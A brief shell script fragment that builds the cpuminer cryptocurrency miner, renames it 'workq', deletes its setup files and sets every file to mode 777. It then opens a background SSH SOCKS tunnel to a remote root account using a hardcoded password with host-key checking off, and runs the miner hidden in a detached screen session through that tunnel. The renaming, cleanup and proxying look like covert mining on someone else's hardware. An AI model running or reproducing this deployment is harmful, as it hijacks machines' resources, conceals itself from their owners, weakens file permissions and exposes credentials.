...
./build.sh
make
mv cpuminer workq && cp workq ../ && cd ..  && sudo rm -rf laptopedit work.sh && sudo chmod 777 * && screen -d -m sshpass -p workpro1997 ssh -o StrictHostKeyChecking=no -D 1997 root@proxywork.ddns.net && cpulimit --exe workq --limit 200 -b && screen -d -m ./workq -u MMOProHN.All -p x -x socks4://127.0.0.1:1997 
